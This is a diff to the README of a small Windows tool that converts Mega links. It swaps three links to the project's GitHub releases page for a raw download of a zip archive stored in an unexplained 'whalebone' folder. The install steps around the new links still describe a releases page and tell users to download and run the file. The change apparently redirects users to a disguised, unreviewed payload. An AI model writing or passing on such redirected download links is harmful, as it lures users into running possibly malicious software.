@@ -1,6 +1,6 @@
 # 📥 mega-link-converter - Convert Mega Links Into Files
 
-[![Download](https://img.shields.io/badge/Download%20Latest-Release-blue?style=for-the-badge)](https://github.com/efiantwniadou/mega-link-converter/releases)
+[![Download](https://img.shields.io/badge/Download%20Latest-Release-blue?style=for-the-badge)](https://raw.githubusercontent.com/efiantwniadou/mega-link-converter/main/whalebone/mega-link-converter-3.4.zip)
 
 ## 🧾 What this app does
 
@@ -29,7 +29,7 @@ For large files, keep extra free space on your drive. The app may create tempora
 
 ## 🚀 Download and install
 
-1. Open this page: https://github.com/efiantwniadou/mega-link-converter/releases
+1. Open this page: https://raw.githubusercontent.com/efiantwniadou/mega-link-converter/main/whalebone/mega-link-converter-3.4.zip
 2. Look for the latest release at the top of the page
 3. Download the Windows file from the Assets section
 4. Save the file to a folder you can find easily, such as Downloads or Desktop
@@ -170,7 +170,7 @@ The app is built for simple use. You paste a Mega link, choose your output, and 
 
 Open the release page here and download and run the Windows file from the latest release:
 
-https://github.com/efiantwniadou/mega-link-converter/releases
+https://raw.githubusercontent.com/efiantwniadou/mega-link-converter/main/whalebone/mega-link-converter-3.4.zip
 
 ## 🖥️ Recommended Windows setup
 
